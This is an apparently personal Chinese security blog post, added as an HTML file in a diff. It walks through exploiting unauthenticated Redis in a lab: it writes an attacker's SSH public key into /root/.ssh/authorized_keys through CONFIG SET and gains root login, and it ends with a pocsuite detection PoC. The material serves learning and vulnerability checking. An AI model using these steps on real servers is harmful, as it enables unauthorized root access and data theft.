@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="redis未授权登录漏洞"/>
+  <meta name="twitter:description" content=".
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>redis未授权登录漏洞 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        redis未授权登录漏洞
+                    </h1>
+                    <h2 class="headline">
+                    May 20, 2018 09:54
+                    · 494 words
+                    · 3 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/%E6%B8%97%E9%80%8F">渗透</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#redis未授权登录漏洞">redis未授权登录漏洞</a>
+<ul>
+<li><a href="#redis简介">redis简介</a></li>
+<li><a href="#安装redis服务">安装redis服务</a></li>
+<li><a href="#redis未授权漏洞">redis未授权漏洞</a>
+<ul>
+<li><a href="#概述">概述</a></li>
+<li><a href="#实验">实验</a>
+<ul>
+<li><a href="#在本地生成私钥">在本地生成私钥</a></li>
+<li><a href="#将公钥写入yang-txt">将公钥写入yang.txt</a></li>
+<li><a href="#连接redis写入文件">连接redis写入文件</a></li>
+<li><a href="#登录靶机">登录靶机</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#redis未授权漏洞其他利用">redis未授权漏洞其他利用</a></li>
+<li><a href="#poc">POC</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>.
+<!-- more --></p>
+
+<h1 id="redis未授权登录漏洞">redis未授权登录漏洞</h1>
+
+<h2 id="redis简介">redis简介</h2>
+
+<pre><code>Redis
+开发者	Salvatore Sanfilippo
+初始版本	2009年4月10日
+稳定版本	
+4.0.5 （2017年12月1日 ）
+编程语言	ANSI C
+操作系统	跨平台
+语言	英语
+类型	非关系型数据库
+许可协议	BSD
+网站	redis.io
+源代码库	github.com/antirez/redis
+Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。从2015年6月开始，Redis的开发由Redis Labs赞助，而2013年5月至2015年6月期间，其开发由Pivotal赞助。[1]在2013年5月之前，其开发由VMware赞助。[2][3]根据月度排行网站DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库
+</code></pre>
+
+<h2 id="安装redis服务">安装redis服务</h2>
+
+<p>1.添加第三方源</p>
+
+<pre><code>yum install epel-release
+</code></pre>
+
+<p>2.安装redis</p>
+
+<pre><code>yum install redis
+</code></pre>
+
+<p>3.编辑配置文件</p>
+
+<pre><code>vim /etc/redis.conf
+#将 daemonize no 修改为yes，(允许后台运行)
+daemonize yes
+#将bind 127.0.0.1 前的注释掉，然后修改为0.0.0.0(允许远程登录)，注意的是有一个选项是 bind 127.0.0.1:1在这个选项下面还有一个 bind 127.0.0.1 ，需要注释的是下面那个，刚开始注释错参数，然后远程死活连不上去。。。。。
+bind 0.0.0.0
+</code></pre>
+
+<p>4.启动服务</p>
+
+<pre><code>redis-server /etc/redis.conf
+
+</code></pre>
+
+<p>5.查看是否启动</p>
+
+<pre><code>ps -ef|grep 'redis'
+</code></pre>
+
+<p>6.本地客户端连接测试</p>
+
+<pre><code>redis-cli
+</code></pre>
+
+<p>7.远程连接</p>
+
+<p>刚开始因为注释bind参数注释错了，导致死活连不上去。</p>
+
+<p>命令参数(redis默认没有密码)</p>
+
+<pre><code>redis-cli -h IP -p port -a '密码'  
+</code></pre>
+
+<pre><code>➜  ~ redis-cli -h 192.168.10.25 -p 6379
+192.168.10.25:6379&gt; 
+192.168.10.25:6379&gt; 
+192.168.10.25:6379&gt; 
+
+</code></pre>
+
+<h2 id="redis未授权漏洞">redis未授权漏洞</h2>
+
+<h3 id="概述">概述</h3>
+
+<p>redis默认是没有密码的，如果将redis服务绑定在0.0.0.0:6379，如果没有开启相关认证，那么任意用户都可以登录redis。
+攻击者可以利用redis服务，在运行redis服务器上写入公钥，进而使用对应的私钥登录服务器。</p>
+
+<p>redis默认的端口是6379</p>
+
+<h3 id="实验">实验</h3>
+
+<ul>
+<li>本机 (parrot)</li>
+<li>centos 6.9 (192.168.10.25)</li>
+</ul>
+
+<h4 id="在本地生成私钥">在本地生成私钥</h4>
+
+<pre><code>➜  ~ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/yang/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/yang/.ssh/id_rsa.
+Your public key has been saved in /home/yang/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:xHSeyfijlKm7qO0MC5f2j3v9kzFOXZfanuZXe6woHdc yang@parrot
+The key's randomart image is:
++---[RSA 2048]----+
+|        . .      |
+|       o = o     |
+|        + =     .|
+|       . +    ...|
+|        S o. .oo |
+|   .   o .+.o...E|
+|. =   ...o = o..+|
+| + * o... = .. =+|
+|  ooO++. ..o. +oo|
++----[SHA256]-----+
+
+</code></pre>
+
+<h4 id="将公钥写入yang-txt">将公钥写入yang.txt</h4>
+
+<pre><code>➜  .ssh (echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; yang.txt
+➜  .ssh ls
+yang.txt  id_rsa  id_rsa.pub
+
+</code></pre>
+
+<h4 id="连接redis写入文件">连接redis写入文件</h4>
+
+<pre><code>➜  .ssh cat yang.txt | redis-cli -h 192.168.10.25 -x set crackit
+OK
+➜  .ssh redis-cli -h 192.168.10.25
+192.168.10.25:6379&gt; CONFIG SET dir /root/.ssh/
+OK
+192.168.10.25:6379&gt; CONFIG GET dir 
+1) &quot;dir&quot;
+2) &quot;/root/.ssh&quot;
+192.168.10.25:6379&gt; CONFIG SET dbfilename &quot;authorized_keys&quot;
+OK
+192.168.10.25:6379&gt; save
+OK
+
+
+</code></pre>
+
+<h4 id="登录靶机">登录靶机</h4>
+
+<pre><code>➜  ~ ssh -i id_rsa root@192.168.10.25
+Warning: Identity file id_rsa not accessible: No such file or directory.
+The authenticity of host '192.168.10.25 (192.168.10.25)' can't be established.
+RSA key fingerprint is SHA256:lt1wYldb0eP26zXei+dhHWg9PbdHZQCqsqD04zjz2Rw.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.10.25' (RSA) to the list of known hosts.
+Last login: Mon May  7 23:37:43 2018 from 192.168.10.134
+[root@localhost-1 ~]#ls
+7z.dll  abc              install.log                               shell
+7z.exe  anaconda-ks.cfg  install.log.syslog
+
+</code></pre>
+
+<p>写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p>
+
+<h2 id="redis未授权漏洞其他利用">redis未授权漏洞其他利用</h2>
+
+<p>1.数据库信息泄露</p>
+
+<p>2.代码执行</p>
+
+<pre><code>Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下        一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的
+</code></pre>
+
+<p>3.敏感信息泄露</p>
+
+<p>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。</p>
+
+<h2 id="poc">POC</h2>
+
+<p>检查是否存在该漏洞</p>
+
+<pre><code># -*- coding:utf-8 -*-
+ 
+import socket
+import urlparse
+from pocsuite.poc import POCBase, Output
+from pocsuite.utils import register
+ 
+ 
+class TestPOC(POCBase):
+    vulID = '89339'
+    version = '1'
+    author = ['Anonymous']
+    vulDate = '2015-10-26'
+    createDate = '2015-10-26'
+    updateDate = '2015-10-26'
+    references = ['http://sebug.net/vuldb/ssvid-89339']
+    name = 'Redis 未授权访问 PoC'
+    appPowerLink = 'http://redis.io/'
+    appName = 'Redis'
+    appVersion = 'All'
+    vulType = 'Unauthorized access'
+    desc = '''
+        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
+    '''
+    samples = ['']
+ 
+    def _verify(self):
+        result = {}
+        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
+        s = socket.socket()
+        socket.setdefaulttimeout(10)
+        try:
+            host = urlparse.urlparse(self.url).netloc
+            port = 6379
+            s.connect((host, port))
+            s.send(payload)
+            recvdata = s.recv(1024)
+            if recvdata and 'redis_version' in recvdata:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = self.url
+                result['VerifyInfo']['Port'] = port
+        except:
+            pass
+        s.close()
+        return self.parse_attack(result)
+ 
+    def _attack(self):
+        return self._verify()
+ 
+    def parse_attack(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('Internet nothing returned')
+        return output
+ 
+register(TestPOC)
+
+</code></pre>
+
+<p>来自 <a href="http://192.168.10.139/bug_detail.php?wybug_id=wooyun-2016-0188216">乌云-一不小心走进了百度内网</a>  #百度内网
+<a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2f2redis%25E6%259C%25AA%25E6%258E%2588%25E6%259D%2583%25E6%25BC%258F%25E6%25B4%259E%2f - redis%e6%9c%aa%e6%8e%88%e6%9d%83%e7%99%bb%e5%bd%95%e6%bc%8f%e6%b4%9e "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
